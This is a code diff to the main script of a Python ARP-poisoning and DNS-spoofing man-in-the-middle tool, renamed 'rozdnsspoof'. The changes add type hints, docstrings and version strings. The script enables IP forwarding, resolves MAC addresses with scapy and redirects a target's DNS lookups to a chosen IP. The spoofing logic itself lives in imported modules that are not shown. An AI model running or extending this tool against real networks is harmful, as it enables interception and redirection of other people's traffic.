@@ -8,8 +8,11 @@ from DNSSpoof import DNSSPoof
 from scapy.all import srp
 from scapy.layers.l2 import ARP, Ether
 
+app_name = "rozdnsspoof"
+app_version = "0.1"
+
 # Reads program arguments
-def arg_parser():
+def arg_parser() -> argparse.Namespace:
     parser = argparse.ArgumentParser()
     parser.add_argument("-n", "--network", required=True, help="Specify the network device name to use")
     parser.add_argument("-g", "--gatewayIP", required=True, help="Specify the gateway IP address")
@@ -18,22 +21,22 @@ def arg_parser():
     parser.add_argument("-r", "--redirecttoIP", required=True, help="Specify the IP address to redirect to")
     return parser.parse_args()
             
-def read_MAC(ip):    
+def read_MAC(ip) -> str:    
     ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=3)
     for s,r in ans:
         return r[Ether].src
 
-# Clean iptables
 def clean_forwarding():
+    """Disable IP forwarding"""
     with open('/proc/sys/net/ipv4/ip_forward', 'w') as forward:
         forward.write('0\n')
 
 def start_forwarding():
+    """Enable IP forwarding"""
     with open('/proc/sys/net/ipv4/ip_forward', 'w') as forward:
         forward.write('1\n')
 
-# Main function
-def main(args):
+def main(args) -> int:
     arp_poisoning = None
     arp_thread = None
     dns_spoof = None
@@ -42,7 +45,7 @@ def main(args):
     exit_code = 0
 
     try:
-        print("[*] rozmitmat started [CTRL-C to stop]")
+        print("[*] {} v{} started [CTRL-C to stop]".format(app_name, app_version))
 
         start_forwarding()
 
@@ -68,7 +71,7 @@ def main(args):
         arp_poisoning.restore_target()
         clean_forwarding()
 
-        print("\n[*] rozmitmat finished .. shouldn't be here :/")
+        print("\n[*] {} finished .. shouldn't be here :/".format(app_name))
 
     except KeyboardInterrupt:
         print("\n[-] Detected CTRL-C, stopping...")
@@ -97,10 +100,6 @@ def main(args):
 
     return exit_code
 
-#sudo apt-get install build-essential python3-dev libnetfilter-queue-dev
-#pip3 install NetfilterQueue
-#pip3 install scapy
-
 if __name__ == "__main__":
     args = arg_parser()
 
@@ -108,5 +107,5 @@ if __name__ == "__main__":
         print("[-] Please run as root")
         sys.exit(1)
 
-    print("[*] rozmitmat stopped")
+    print("[*] {} stopped".format(app_name))
     sys.exit(main(args))
